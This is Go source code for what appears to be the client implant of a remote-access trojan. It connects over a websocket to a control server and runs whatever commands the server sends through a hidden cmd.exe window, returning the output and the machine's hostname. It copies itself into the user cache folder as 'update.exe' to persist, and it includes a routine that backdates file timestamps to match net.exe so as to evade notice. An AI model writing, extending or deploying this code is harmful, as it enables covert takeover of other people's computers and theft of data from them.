package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"path"
	"strings"
	"syscall"
	"time"
	"yotamura/common"

	"github.com/gorilla/websocket"
)

var addr = flag.String("addr", "localhost:8080", "http service address")

type Client struct {
	*common.Client
}

func Exec(command string) ([]byte, error) {
	cmd_path := "C:\\Windows\\system32\\cmd.exe"
	cmd_instance := exec.Command(cmd_path, "/c", command)
	cmd_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd_output, err := cmd_instance.Output()
	return cmd_output, err
}

func (c *Client) runCommand(command string) {
	//runs the requested command with Exec()
	//and sends a message back to the server

	output, err := Exec(command)
	if err != nil {
		//handle err
	}
	data := common.CommandData{Command: command, Output: string(output)}
	c.SendJsonMessage(common.CreateMessage(data))
	fmt.Println("sent command data")
}

func (c *Client) HandleMessages() {
	for {
		message := c.GetWsMessage()
		fmt.Println(message)

		switch message.Type {
		case "CommandData":
			fmt.Println("command")
			var content common.CommandData
			common.DecodeData(message.Data, &content)
			c.runCommand(content.Command)
		case "StatsData":
			fmt.Println("stats")
			var content common.StatsData
			common.DecodeData(message.Data, &content)
			c.Name = content.Name
		default:
			fmt.Printf("Unknown message type: %s\n", message.Type)
		}
	}
}

func (c *Client) SendStats() {
	//sends the information about this client
	//such as the pc hostname
	//and possibly other things

	hostname, _ := os.Hostname()
	c.SendJsonMessage(common.CreateMessage(common.StatsData{Name: hostname}))
}

func reconnect() {
	fmt.Println("reconnecting in 10s")
	time.Sleep(10 * time.Second)
	go main()
}

func ChangeFileCreationDate(file string) {
	//(Get-Item C:\Users\meow\AppData\Local\cache).CreationTime = (Get-Item C:\Windows\System32\net.exe).CreationTime
	//(Get-Item C:\Users\meow\AppData\Local\cache).LastWriteTime = (Get-Item C:\Windows\System32\net.exe).LastWriteTime
	Exec("powershell /c " + fmt.Sprintf(`
	(Get-Item %s).CreationTime = (Get-Item C:\Windows\System32\net.exe).CreationTime 
	&& (Get-Item %s).LastWriteTime = (Get-Item C:\Windows\System32\net.exe).LastWriteTime`,
		file, file))
}

func persist() {
	ex, err := os.Executable()
	if err != nil {
		panic(err)
	}
	fmt.Println(ex)
	if strings.Contains(ex, "go-build") || strings.Contains(ex, "AppData") {
		//this will stop this function from doing anything else
		//1. if this program is run with "go run"
		//2. if the program already exists in the appdata folder
		return
	}

	userCacheDir, _ := os.UserCacheDir()
	programDir := path.Join(userCacheDir, "cache")
	if !common.FileExists(programDir) {
		os.Mkdir(programDir, 0644)
	}
	common.CopyFile(ex, path.Join(programDir, "update.exe"))
}

func main() {
	flag.Parse()

	persist()

	interrupt := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt)

	u := url.URL{Scheme: "ws", Host: *addr, Path: "/ws"}
	fmt.Printf("connecting to %s\n", u.String())

	c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
	if err != nil {
		fmt.Println("dial:", err)
		go reconnect()
		return
	}
	defer c.Close()

	done := make(chan struct{})

	client := Client{
		Client: &common.Client{
			Ws:             c,
			Message:        make(chan common.Message),
			MessageChannel: make(map[string]chan common.Message),
		},
	}

	go client.HandleMessages()
	fmt.Println("handle messages goroutine started")
	go client.SendStats()
	go func() {
		defer close(done)
		for {
			_, msg, err := c.ReadMessage()
			if err != nil {
				fmt.Println("read:", err)
				go reconnect()
				return
			}

			message := common.Message{}
			err = json.Unmarshal(msg, &message)
			if err != nil {
				fmt.Println("failed to convert message to struct")
			}

			client.BroadcastWsMessage(message)
		}
	}()

	channel := make(chan os.Signal, 1)
	signal.Notify(channel, os.Interrupt, syscall.SIGTERM)

	<-channel
	os.Exit(0)
}
